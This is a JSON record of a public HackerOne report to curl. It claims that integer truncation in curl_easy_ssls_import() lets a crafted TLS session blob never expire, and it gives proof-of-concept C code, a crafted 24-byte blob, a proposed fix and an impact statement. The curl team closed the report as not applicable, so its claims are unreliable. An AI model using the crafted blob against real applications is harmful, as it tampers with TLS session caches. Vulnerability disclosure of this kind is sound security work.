@@ -1,0 +1,119 @@
+{
+  "id": 3658049,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjU4MDQ5",
+  "url": "https://hackerone.com/reports/3658049",
+  "title": "libcurl: Integer truncation in curl_easy_ssls_import() causes TLS sessions to never expire",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "medium",
+  "readable_substate": "N/A",
+  "created_at": "2026-04-08T13:18:59.069Z",
+  "submitted_at": "2026-04-08T13:18:59.531Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "adityasunny_06",
+    "url": "/adityasunny_06",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/y8j7fz391wg7uhcj1kmwnw57vnin/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-04-09T05:49:38.106Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-04-08T21:49:42.940Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n`curl_easy_ssls_import()` deserializes a TLS session blob and stores it in the in-memory session cache. In `Curl_ssl_session_unpack()` (`lib/vtls/vtls_spack.c:311`), the `valid_until` field is read as `uint64_t` and cast directly to `curl_off_t` (`int64_t`) with no bounds check — so a crafted blob encoding `valid_until = 0xFFFFFFFFFFFFFFFF` produces `valid_until = -1` after the cast. The import path (`Curl_ssl_session_import` → `cf_scache_peer_add_session`) stores the session directly, bypassing the `valid_until <= 0` reset that the normal add path (`cf_scache_add_session`) applies. The expiry predicate `(valid_until > 0) && (valid_until < now)` then evaluates `(-1 > 0) = FALSE`, so the session is never evicted from the cache. Additionally, `curl_easy_ssls_export()` returns `CURLE_BAD_FUNCTION_ARGUMENT` for this session (the pack side rejects `valid_until < 0`), leaving it permanently stuck in-memory yet still retrievable for TLS resumption via `Curl_ssl_scache_take()`.\n\n> **AI Disclosure:** This report was produced with AI assistance. All findings were verified by running the proof-of-concept against libcurl 8.19.0 source code.\n\n## Affected version\n\n```\nlibcurl/8.19.0-DEV OpenSSL/3.5.5 zlib/1.3.1 brotli/1.1.0 zstd/1.5.7 nghttp2/1.64.0\nLinux x86_64\nFeature gate: USE_SSLS_EXPORT (enabled by default with OpenSSL, GnuTLS, wolfSSL, mbedTLS)\nIntroduced in: curl 8.12.0 (when curl_easy_ssls_import was added)\n```\n\n## Steps To Reproduce:\n\n### Option A — Standalone (no libcurl build required)\n\nCompiles and runs without any libcurl dependency. Proves the cast and expiry logic in isolation.\n\n```c\n// Save as poc_standalone.c\n// Build: gcc -DSTANDALONE -o poc poc_standalone.c && ./poc\n#include <stdio.h>\n#include <stdint.h>\n#include <time.h>\n\nstatic int expiry_check(int64_t valid_until, int64_t now) {\n    /* exact copy of cf_scache_session_expired() — vtls_scache.c:501 */\n    return (valid_until > 0) && (valid_until < now);\n}\n\nint main(void) {\n    int64_t now = (int64_t)time(NULL);\n\n    /* attacker sets VALID_UNTIL = 0xFFFFFFFFFFFFFFFF in blob */\n    uint64_t evil_u64    = 0xFFFFFFFFFFFFFFFFULL;\n    int64_t  evil_i64    = (int64_t)evil_u64;   /* vtls_spack.c:311 — no check */\n\n    printf(\"val64 in blob : 0x%016llx\\n\", (unsigned long long)evil_u64);\n    printf(\"valid_until   : %lld  (wraps to -1)\\n\", (long long)evil_i64);\n    printf(\"(-1 > 0)      : %s → session NEVER expires\\n\",\n           (evil_i64 > 0) ? \"TRUE\" : \"FALSE\");\n    printf(\"expired?      : %s\\n\",\n           expiry_check(evil_i64, now) ? \"YES\" : \"NO  ← BUG\");\n    return 0;\n}\n```\n\n**Expected output:**\n```\nval64 in blob : 0xffffffffffffffff\nvalid_until   : -1  (wraps to -1)\n(-1 > 0)      : FALSE → session NEVER expires\nexpired?      : NO  ← BUG\n```\n\n---\n\n### Option B — Full libcurl PoC\n\nRequires libcurl ≥ 8.12.0 built with `USE_SSLS_EXPORT`.\n\n**Crafted blob (24 bytes, TLV big-endian as defined in `vtls_spack.c`):**\n```\n01                         ← CURL_SPACK_VERSION marker (0x01)\n04  00 08                  ← CURL_SPACK_TICKET tag + uint16 length = 8\nDE AD BE EF CA FE BA BE    ← 8 bytes dummy ticket data\n02  03 04                  ← CURL_SPACK_IETF_ID tag + uint16 = 0x0304 (TLS 1.3)\n03                         ← CURL_SPACK_VALID_UNTIL tag\nFF FF FF FF FF FF FF FF    ← uint64 big-endian = UINT64_MAX → int64 = -1\n```\n\n```c\n// Save as poc.c\n// Build: gcc -o poc poc.c -lcurl && ./poc\n#include <stdio.h>\n#include <curl/curl.h>\n\nstatic const unsigned char crafted_blob[] = {\n    0x01,\n    0x04, 0x00, 0x08, 0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe,\n    0x02, 0x03, 0x04,\n    0x03, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff\n};\n\nint main(void) {\n    CURL  *curl;\n    CURLSH *share;\n    CURLcode rc;\n\n    curl_global_init(CURL_GLOBAL_DEFAULT);\n\n    /* share needed to initialise the TLS session cache (ssl_scache) */\n    share = curl_share_init();\n    curl_share_setopt(share, CURLSHOPT_SHARE, CURL_LOCK_DATA_SSL_SESSION);\n\n    curl = curl_easy_init();\n    curl_easy_setopt(curl, CURLOPT_SHARE, share);\n\n    rc = curl_easy_ssls_import(curl,\n                               \"example.com:443:G\",  /* global peer key */\n                               NULL, 0,\n                               crafted_blob, sizeof(crafted_blob));\n\n    printf(\"curl_easy_ssls_import: %d (%s)\\n\", rc, curl_easy_strerror(rc));\n    /* Expected: 0 (No error) — blob accepted, session stored with valid_until=-1 */\n\n    curl_easy_cleanup(curl);\n    curl_share_cleanup(share);\n    curl_global_cleanup();\n    return rc;\n}\n```\n\n**Expected output (vulnerable build):**\n```\ncurl_easy_ssls_import: 0 (No error)\n```\n\nThe session is now in the TLS cache with `valid_until = -1`. It survives every subsequent call to `cf_scache_peer_remove_expired()` because `(-1 > 0) = FALSE`. It is also un-exportable — `curl_easy_ssls_export()` returns `CURLE_BAD_FUNCTION_ARGUMENT` (43) for it because `Curl_ssl_session_pack()` rejects `valid_until < 0` — leaving it permanently irremovable while still being served to servers via `Curl_ssl_scache_take()`.\n\n---\n\n### Relevant source locations\n\n| File | Line | Note |\n|------|------|------|\n| `lib/vtls/vtls_spack.c` | 311 | `s->valid_until = (curl_off_t)val64;` — missing bounds check |\n| `lib/vtls/vtls_spack.c` | 199 | Pack side rejects `< 0`, unpack side does not |\n| `lib/vtls/vtls_scache.c` | 501 | `(valid_until > 0) && (valid_until < now)` — negative bypasses |\n| `lib/vtls/vtls_scache.c` | 796 | Normal add path resets `<= 0` — import path skips this |\n| `lib/vtls/vtls_scache.c` | 1127 | Import calls `cf_scache_peer_add_session` directly, no reset |\n\n### Proposed fix\n\n```c\n/* vtls_spack.c, after spack_dec64 call in CURL_SPACK_VALID_UNTIL case */\nif(val64 > (uint64_t)CURL_OFF_T_MAX) {\n    r = CURLE_READ_ERROR;\n    goto out;\n}\ns->valid_until = (curl_off_t)val64;\n```\n\n## Impact\n\nAn attacker who can write to the session blob passed to curl_easy_ssls_import() — for example by tampering with a session persistence file on disk — can inject a TLS session with valid_until = -1. This session is never evicted from the in-memory TLS cache (expiry check always FALSE) and cannot be cleaned up via re-export. If the injected ticket corresponds to a revoked or compromised TLS session, libcurl will continue offering it for TLS session resumption indefinitely, bypassing the intended expiry-based eviction. Applications most at risk are those that persist TLS sessions to disk across process restarts with weak file permission controls on the session store.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 23,
+  "voters": [
+    "2026",
+    "m4dm0e",
+    "adityasunny_06",
+    "catalysed",
+    "salama_mah",
+    "kuliex270",
+    "might-be-andrew",
+    "holohydra",
+    "shacod",
+    "sprangerl33t",
+    "and 13 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
